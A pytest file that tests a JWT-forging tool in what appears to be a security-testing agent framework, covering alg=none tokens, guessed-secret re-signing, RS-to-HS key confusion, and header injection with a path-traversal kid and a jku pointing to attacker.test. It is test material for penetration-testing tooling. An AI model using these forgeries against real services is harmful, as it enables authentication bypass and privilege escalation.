"""forge_jwt: the JWT attack primitives (OWASP API2)."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any

import jwt
import pytest
from agents.tool_context import ToolContext

from strix.tools.jwt.tool import forge_jwt


async def _forge(**kwargs: Any) -> dict[str, Any]:
    ctx = ToolContext(
        context={}, tool_name="forge_jwt", tool_call_id="call-1", tool_arguments="{}"
    )
    raw = await forge_jwt.on_invoke_tool(ctx, json.dumps(kwargs))
    return json.loads(raw)


@pytest.mark.asyncio
async def test_alg_none_is_unsigned_and_claims_are_editable() -> None:
    victim = jwt.encode({"sub": "alice", "role": "user"}, "serversecret", algorithm="HS256")
    out = await _forge(base_token=victim, claim_overrides={"role": "admin"}, algorithm="none")

    assert out["success"]
    assert out["header"]["alg"] == "none"
    assert out["token"].endswith(".")  # empty signature segment
    # claim tampering carried through, rest inherited from the victim token
    assert out["payload"] == {"sub": "alice", "role": "admin"}


@pytest.mark.asyncio
async def test_claim_edit_resigned_with_a_guessed_secret() -> None:
    out = await _forge(
        claims={"sub": "bob"}, claim_overrides={"role": "admin"}, algorithm="HS256", key="weak"
    )
    assert out["success"]
    # a server trusting 'weak' would verify this
    decoded = jwt.decode(out["token"], "weak", algorithms=["HS256"])
    assert decoded["role"] == "admin"


@pytest.mark.asyncio
async def test_rs_to_hs_confusion_signs_with_the_public_key() -> None:
    public_pem = "-----BEGIN PUBLIC KEY-----\nFAKEKEYMATERIAL\n-----END PUBLIC KEY-----"
    out = await _forge(claims={"sub": "x"}, algorithm="HS256", key=public_pem)
    assert out["success"]
    assert out["header"]["alg"] == "HS256"
    assert out["payload"]["sub"] == "x"
    # A server vulnerable to confusion HMAC-verifies with the public key it
    # published. Recompute that HMAC and confirm the forged signature matches.
    signing_input, sig_b64 = out["token"].rsplit(".", 1)
    expected = hmac.new(public_pem.encode(), signing_input.encode(), hashlib.sha256).digest()
    assert base64.urlsafe_b64encode(expected).rstrip(b"=").decode() == sig_b64


@pytest.mark.asyncio
async def test_header_injection_sets_kid_and_jku() -> None:
    out = await _forge(
        claims={"sub": "x"},
        algorithm="none",
        extra_headers={"kid": "../../dev/null", "jku": "https://attacker.test/jwks.json"},
    )
    assert out["success"]
    assert out["header"]["kid"] == "../../dev/null"
    assert out["header"]["jku"] == "https://attacker.test/jwks.json"


@pytest.mark.asyncio
async def test_signing_alg_without_key_is_rejected() -> None:
    out = await _forge(claims={"sub": "x"}, algorithm="HS256")
    assert not out["success"]
    assert "needs a key" in out["error"]
